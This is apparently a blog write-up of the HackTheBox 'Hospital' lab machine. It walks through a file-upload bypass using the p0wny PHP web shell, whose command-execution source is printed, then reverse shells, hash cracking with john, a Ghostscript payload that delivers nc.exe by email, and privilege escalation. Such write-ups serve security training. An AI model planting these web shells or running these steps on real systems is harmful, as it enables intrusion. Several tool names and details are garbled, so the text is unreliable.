---
layout: post
title: "Hospital 20c59ccb35cc4f3f99a35e93dd0be86a"
date:   2025-07-10 12:05:57 -0400
categories: writeups
---

# Hospital

HackTheBox: Medium

<aside>
ðŸ’¡ Monitored is a windows machine

</aside>

## 1: Enumeration

- nmap scanning

 

![Untitled]({{ '/assets/images/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5_Untitled.png' | relative_url }})

![Untitled]({{ '/assets/images/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5_Untitled_1.png' | relative_url }})

![Untitled]({{ '/assets/images/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5_Untitled_2.png' | relative_url }})

![Untitled]({{ '/assets/images/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5_Untitled_3.png' | relative_url }})

We can see 2 http services, go forward the one which allows create an account

> Testing some allowed extensions, we realise .phar extensions.
There is a  tool called ponyshell, downloaded and change its extensions
> 

```bash
<?php

$SHELL_CONFIG = array(
    'username' => 'p0wny',
    'hostname' => 'shell',
);

function expandPath($path) {
    if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
        exec("echo $match[1]", $stdout);
        return $stdout[0] . $match[2];
    }
    return $path;
}

function allFunctionExist($list = array()) {
    foreach ($list as $entry) {
        if (!function_exists($entry)) {
            return false;
        }
    }
    return true;
}

function executeCommand($cmd) {
    $output = '';
    if (function_exists('exec')) {
        exec($cmd, $output);
        $output = implode("\n", $output);
    } else if (function_exists('shell_exec')) {
        $output = shell_exec($cmd);
    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
        ob_start();
        system($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
        ob_start();
        passthru($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {
        $handle = popen($cmd, 'r');
        while (!feof($handle)) {
            $output .= fread($handle, 4096);
        }
        pclose($handle);
    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {
        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);
        $output = stream_get_contents($pipes[1]);
        proc_close($handle);
    }
    return $output;
}

function isRunningWindows() {
    return stripos(PHP_OS, "WIN") === 0;
}
```

We can search with gobuster to search routes 

![Untitled]({{ '/assets/images/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5_Untitled_4.png' | relative_url }})

## 2: User flag

We can use a rev shell and generate estability

Using uname -a we can see there is a vulnerable kernel version, download the exploit 

- We are root at data â†’ cat /etc/passwd

```bash
john hash.txt rockyou.txt
```

Weâ€™ve got creds in the 443 port interface, there we find a Gohostscript vulnerability

Clone the repository and create the payload to injected 

1. We send a payload with nc.exe request by email

![Untitled]({{ '/assets/images/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5_Untitled_5.png' | relative_url }})

1. Once it is on the victim machine we sent another payload with the rev shell

![Untitled]({{ '/assets/images/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5_Untitled_6.png' | relative_url }})

## 3: Priv esc

Start this part where you spawn, theres is a file called ghostscrip.bat lets type it

> We found some rcpclient creds
> 

### rcpclient

It has functions of authentication and enumeration of services, getting information about users

```bash
rcpclient -u "user" url 
querydispinfo
```

We realise that guest user has admin permises so lets go to C:\xampp\htdocs and user ponyshell again wiht a .php ext

Machine pwned./!!